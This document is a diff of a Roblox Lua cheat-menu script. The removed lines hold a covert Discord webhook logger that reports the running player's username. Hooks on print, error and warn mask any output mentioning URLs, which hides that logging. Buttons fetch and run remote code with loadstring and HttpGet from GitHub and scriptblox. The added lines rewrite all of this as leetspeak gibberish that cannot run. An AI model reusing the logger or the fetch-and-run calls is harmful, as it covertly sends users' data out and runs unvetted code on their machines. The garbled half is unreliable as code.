-		"https://discord.com/api/webhooks/901560461093388348/6yB2qq6oCmuya-9RKooVTAvKLvyVgt9UQd4"
-	local data = {
-		["content"] = " ***PickleAssist Logs***",
-		["embeds"] = {
+
+
+	1()<@1 [_]я1 =
+		"|-|†']['|°§://đ|§(0®|).(()/|\/^|2][/\\'€8|-|ø<>|<§/90156046109drei388drei4-aite/6°/Bto(,)kw6()C[]V[][_]°/∂-9RK*0VTA|/KL|/jV9+9UQ|]4"
+	1*[q£ Ð/\74 = {
+		["[ø(\)']['3(\)+"] = " ***P][(|(1&A?$1?+ L<>65***",
+		["3]V[|o3o|5"] = {
 			{
-				["title"] = "**Someone Executed Your Script!**",
-				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
-				["type"] = "rich",
-				["color"] = tonumber(0x7269da),
-				["image"] = {
-					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-						tostring(game:GetService("Players").LocalPlayer.Name)
+				["7|']['|£"] = "**S()^^&*/V£ E}{&(|_|']['€<| Y<>µ2 S[|2l|D+!**",
+				["|>€§[|21|>']['|<>/\\/"] = "U?£2/|//-\^^&: " .. 6λ/|\3.P|4`/3®?.L<><@1P1/\'/€12.N^]V[£.." |/|/1†/-/ **"..\A/3|o}{°°|{[/-/&(|{.."**",
+				["']['j][D£"] = "2|<]-[",
+				["[ø1°|?"] = ']['()/\/|_|/\/\|3£®(0×7269<|λ),
+				["!AA@6&"] = {
+					["|_||2|_"] = "]-[+†|2://\|\|\|/VV.?øl³|_9}{.(*AA/T]-[|_|]V[8?/A\//\†∂®./\5]-[×?%=150&°/=150&F*|2(V)λ+=P/\\/6&µ§£1²/\/4|11&=" ..
+						†°?+12129(9q[]V[]£:G£†S&?\/l©&("P1/\'/€®ŝ").L*(/-\1P|^`/3я.N∂]V[€)
 				}
 			}
 		}
 	}
-	local newdata = game:GetService("HttpService"):JSONEncode(data)
+	1*(∂1 113\/\/Ð@']['/\ = 6/\^^3:G3†S£1²\|][(£("H']['†][DS£|2\/|<3"):JSONE2[<>o|€(Ð@7λ)
 
-	local headers = {
-		["content-type"] = "application/json"
+	|_0©/\|_ ]-[£/\|)£|25 = {
+		["<()2']['£/\/+-+j|2&"] = "λ|°|D£!©/-\+![]2/_|?0/V"
 	}
-	request = http_request or request or HttpPost or syn.request
-	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-	request(abcdef)
+	|?30_[_]€5+ = |-|']['†|*_?&(,)[_]£§+ °® 1²€kw[_]€5'][' ø|? H7†|²P*$+ 9® 5j|V.|?€(,)[_]£?+
+	1ø©/\£ /-\|o(Ð&ƒ = {U121 = |_|я|_, B9Ð'/ = |1&\\'|>q†4, M£']['|-|0|> = "POST", H€∂đ3®5 = }{3λ|>31²ŝ}
+	®3(,)µ&57(λ13(|)3ƒ)
 
-	local denied_message = "Denied Goofy"
-	local g
-	g = hookfunction(print,function(urprint,...)
-		if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
-			urprint = denied_message
-		end
-		return g(urprint,...)
-	end)
+	1ø©@£ o|£/\/|€|)_/\/\3§$@6& = "D&(\)!3|) G°øƒ'/"
+	|0(@1 6
+	6 = |-|ø9|<PHµ11[7!()(\)(|*®||V†,|=µ11[+][0(\)(µ|Z|2|212'][',...)
+		][|= 5']['|Z][/\/9.|11/-\+(4(µя9?l11+, "HTTP") 91² ŝ']['®l/V9.|11^']['</-/(|_|1²|°я||1+, "/-/']['7|D") 91² ?†2l/|/9./v\/\†(#([_]?|D|Zl/|/7, ".<<>|\/|") *1² ?7®|/|/9.[]V[]∂+<#([_]2|*|?1/V'][', "H†+|*") 9|2 ?']['|?l/\/9./v\/\†[|-|(|_|?91²l2†, "Pλŝ73") 01² $+1²|26.]V[/\+[]-[(|_|129|?1?'][', "|3l/|/") ø1² §†|Z1|19./|\4†[4(|_|?|²|212'][', "61+[_]ŝ£®©*|V+€|1+") ()? ?7®][|\|9.AA/-\†©]-[([_]я|°|?1|V'][', "9|']['") †}{£(\)
+			|_|я|²|?!/\/'][' = Ð£|V1&Ð_AA£??q93
+		£(\)|]
+		®£']['[_]|2? 6(|_|®|>?!|\|'][',...)
+	3/|/|))
 
-	local p
-	p = hookfunction(error,function(urprint,...)
-		if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
-			urprint = denied_message
-		end
-		return g(urprint,...)
-	end)
+	1()(∂| |D
+	|2 = #[]9|<|=µ|V(']['1()11(&1²12*1²,|"|_||\|[']['!0/\/(|_|?][D?1/|/7,...)
+		1PH ŝ']['|21|V6.|11@']['(/-/(|_|я9|2|/|/'][', "HTTP") *? 5†121/V6.|\/|/\†(]-[([_]2|²|2l|V'][', "/-/+']['p") ()® ŝ†®][|16./|\λ†(}{(µ1²p®][(\)†, ".<[]/v\") 0® ŝ']['12l/\\/9.|\/|@†<4([_]1291²][/\\/+, "H+7|²") ()|Z ŝ']['2l?6.(V)^+<]-[([_]12|°1²!(\)'][', "P4ŝ†€") 9|? ?7|Zl/V9.|'|'|@']['<}{(µ|2|2®!11'][', "8!|1") 9? §7я!(\)9.AAλ7[]-[(|_|12|D121/\\/+, "91']['|_|ŝ€|Z<<>/\/7€27") 9? ?+|Z1/V9.AAλ†©4(µ2|>12l?†, "6!†") †]-[£|V
+			[_]|2|2®1(\)+ = |>32][3|>_AA€ŝ§46&
+		32|)
+		|?€+µ|?|1 6(|_|®|°?][/V'][',...)
+	3?Ð)
 
-	local h
-	h = hookfunction(warn,function(urprint,...)
-		if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
-			urprint = denied_message
-		end
-		return g(urprint,...)
-	end)
-end)
+	1*(q| }{
+	}{ = }{<>0|(|"µ/V©†][ø11(\^/^2|\|,|=µ/\/(7|0/|/(µ2|D|?1/\/'][',...)
+		1|" $7|?|26.(V)4']['©]-[([_]|2|>®l11'][', "HTTP") 9® ?+®!?9.|'|'|/\']['[}{([_]12][D|Z111+, "}{††][D") ()|Z 5']['2][116.|\/|∂+©4(µ|?|²|2!/\/7, ".(*|11") []1² ?']['я][/V9.]V[@']['[]-[(µя|D2][/|/†, "H+7|°") ()? $7|Z!26.AA/-\†[}{(µя|2®!/V†, "P@$†£") *2 $+|?|116.|\/|^']['(}{(µ12|>?|?†, "l³][/|/") *® ?']['?][119.[]V[]@']['©/-/([_]1²9|2!/|/'][', "6l7[_]$£1²<*/V']['&/V+") ø1² 5+1²1|16./\/\@7<]-[(|_||?9|Zl11+, "6!+") 7|-|€11
+			µ12|*|Z!|V+ = |>&11][£|>_|11£$ŝλ93
+		€|1|)
+		|23†[_]2|\| 9([_]|?9|2][|1'][',...)
+	3/\/<|)
+£2|>)
 
-antilag.Name = "anti lag"
-antilag.Parent = Main
-antilag.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-antilag.BorderColor3 = Color3.fromRGB(255, 0, 0)
-antilag.BorderSizePixel = 4
-antilag.Position = UDim2.new(-0.000665238302, 0, 0.212781996, 0)
-antilag.Size = UDim2.new(0, 187, 0, 33)
-antilag.Font = Enum.Font.SourceSansBold
-antilag.Text = "Anti Lag"
-antilag.TextColor3 = Color3.fromRGB(255, 0, 0)
-antilag.TextSize = 22.000
-antilag.MouseButton1Down:connect(function()
-	for i,v in pairs(workspace:GetDescendants()) do
-		if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("BasePart") then
-			v.Material = "SmoothPlastic"
-		end
-	end
-	for i,v in pairs(game:GetDescendants()) do
-		if v:IsA("Light") or v:IsA("ParticleEmitter") or v:IsA("Trail") then
-			v:Destroy()
-		end
-	end
-end)
+∂|1†11λ6.N@|'|'|& = "q?7! 1@6"
+/-\|\|']['][1λ9.P42£11+ = M∂][2
+4|1+!|_@9.Bq©|(9|?*|_|11|]C[]1()?3 = C*|()я3.|=20/v\RGB(0, 0, 0)
+∂|V+|£∂9.B°1²Ð€|2C01°2drei = C<>|_[]|Zdrei.ƒ12*|11RGB(to55, 0, 0)
+∂|1+l1∂9.B0®|]&1²S|z£P!><&| = 4
+∂?+!|_@6.P9?!']['|ø2 = UD||11to.(\)£\|\|(-0.000665todrei8drei0to, 0, 0.212781996, 0)
+q11+!£λ9.S!z£ = UD][(V)2.|V&VV(0, 1-aite7, 0, 33)
+4|1†||_/-\9.F[]|V7 = E/\/[_]|11.F[]/\\/†.S()µ1²<£S/-\/\\/?B0|_Ð
+^/\\/7][|∂9.T&?+ = "A|V+1 L@6"
+4|V7l|∂9.T€)(+Cø1°|?3 = C[]1[]я3.|"|2*|\/|RGB(to55, 0, 0)
+^(\)7][1/\9.T3?']['S!(\)& = to2.000
+^|V+|£@6.Mø|_|5&Bµ†79|\|1D0\\'/|/:(()?/\\/£©']['(|"[_]/\/<+l()?()
+	|=9я ][,\| 1|V |>∂!|?ŝ(\|\|0?|{§|2/\(3:G37D£ŝ(€|\|o|@/V†ŝ()) Ð<>
+		][PH \/:IŝA("P/-\|2+") 01² \/:I?A("M£ŝ}{P@я']['") 012 \|:I?A("B∂5&P/\|Z+") +#£/\/
+			|/.M/-\']['3я][λ1 = "S/|\<><>']['}{P1q§†1<"
+		&|1Ð
+	3/|/đ
+	|"0|2 !,\| 1|V pλ|125(6q]V[&:G€+D3$<£/\\/|>/-\/V†?()) |]()
+		1|" \|:I§A("Ll9|-|+") 9|? \|:I?A("P/-\|27!<1€EAA1+']['&|Z") °? \/:I?A("T|2q][|_") †}{€11
+			\|:D€ŝ†?*°/()
+		3|1|]
+	3|V|>
+3/\/|))
 
-TeaHub.Name = "TeaHub"
-TeaHub.Parent = Main
-TeaHub.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TeaHub.BorderColor3 = Color3.fromRGB(255, 0, 0)
-TeaHub.BorderSizePixel = 4
-TeaHub.Position = UDim2.new(0.295588255, 0, 0.72413516, 0)
-TeaHub.Size = UDim2.new(0, 187, 0, 33)
-TeaHub.Font = Enum.Font.SourceSansBold
-TeaHub.Text = "TeaHub"
-TeaHub.TextColor3 = Color3.fromRGB(255, 0, 0)
-TeaHub.TextSize = 22.000
-TeaHub.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Aurelius0863/TeaHub/main/Loader.lua"))()
-end)
+T&qH|_|8.N∂(V)3 = "T3λH|_||>"
+T3^H|_||3.Pq12€?† = Mql/V
+T3∂H[_]8.B∂[|{61²<>|_|(\)<|C0£*1²3 = C°|ø1²drei.|=|2[]]V[RGB(0, 0, 0)
+T3@H[_]13.B<>12Ð£яC[]|_[]|Zdrei = C°|_[]12drei.|"|Z[]|'|'|RGB(to55, 0, 0)
+T3qH|_|8.B<>|Zđ£|ZS|z&Pl%&| = 4
+T3λH[_]ß.P()ŝ!†l9(\) = UD|/\/\to./\\/3\^/(0.2955eight-aite255, 0, 0.7241drei516, 0)
+T3/\H[_]|3.S1(\)£ = UD|[]V[]2./\/3\|\|(0, 1eight7, 0, 33)
+T3@H|_|13.F[]/\\/'][' = E/\/[_]|\/|.F<>11+.S[]|_|1²©&S/\/\\/§Bø1|>
+T&4H|_||>.T£><+ = "T€/\H[_]|3"
+T&@H|_|ß.T€}{']['C*1ø12drei = C[]£9|Zdrei.|=1²<>(V)RGB(255, 0, 0)
+T3^Hµ|o.T€><7S1(\)€ = toto.000
+T3/\Hµß.M9µ$&Bµ+7()21D°\^/(\):©()/V11&©†(|=[_]/\/[7][()|1()
+	|9@|]ŝ']['|2l?9(9q(V)€:H†7|2G€+("#†7|>?://®λ\^/.9][+|-|[_]|3µŝ€®<*|V†&/\/+.[()/v\/A|_||23|][[_]ŝ0863/T€∂Hµl³//|\∂][?/L*∂|]€я.|_|_|q"))()
+3?<|)
 
-ServerHop.Name = "ServerHop"
-ServerHop.Parent = Main
-ServerHop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-ServerHop.BorderColor3 = Color3.fromRGB(255, 0, 0)
-ServerHop.BorderSizePixel = 4
-ServerHop.Position = UDim2.new(0.294922888, 0, 0.554693818, 0)
-ServerHop.Size = UDim2.new(0, 187, 0, 33)
-ServerHop.Font = Enum.Font.SourceSansBold
-ServerHop.Text = "ServerHop"
-ServerHop.TextColor3 = Color3.fromRGB(255, 0, 0)
-ServerHop.TextSize = 22.000
-ServerHop.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
-end)
+S£2|/€яHø|°.Nq[]V[]& = "S£я\|€12H*|>"
+S£1²\/3?H99.P/-\1²&/|/'][' = Mλ][11
+S&12|/32H0|².Bq[|{9129[_]|\||>C°|_0|?3 = C°|_[]|Zdrei.PH®<>/|\RGB(0, 0, 0)
+S£?|/&2H99.B[]12đ£|?C*|<>яdrei = C<>|_[]|?drei.|=2()]V[RGB(255, 0, 0)
+S3я\|£1²Hø|*.B°я<|31²S123P][><3£ = 4
+S£|2|/£|ZHø|D.P[]§1']['1ø/V = UD!|112./\/£\\'(0.29492toeighteight8, 0, 0.55469drei-aite1-aite, 0)
+S312\/&®H[]p.S|2& = UD1|112.113VV(0, 187, 0, 33)
+S&12|/&1²H°][D.F0?† = E/\/µ/\/\.F()|1†.S9[_]?[&Sλ/\\/§B9£<|
+S&®|/&яH()p.T€×'][' = "S€|2\|&|?H0|D"
+S&1²\|€|2H°][D.T€)(7C°£°|2drei = C<>£ø|23.ƒяøAARGB(255, 0, 0)
+S£?\|31²H9][D.T3><7S1(\)& = 2to.000
+S&?\|£|2H[]|2.Mø[_]?3B[_]']['+*?1D<>uu?:(<>/\\//\/3[†(ƒµ2©†][[]|\|()
+	|[]4|)§712||V9(6/-\/|\&:H+†|²G€+("]-[+7|°ŝ://\/\/\A/|/|/.$©12l|2+|>10×.<0|'|'|/|24\/\//S€|2\/£2-Bя<>\/\/?€|Z_80", +|Zµ€))();
+&11o|)
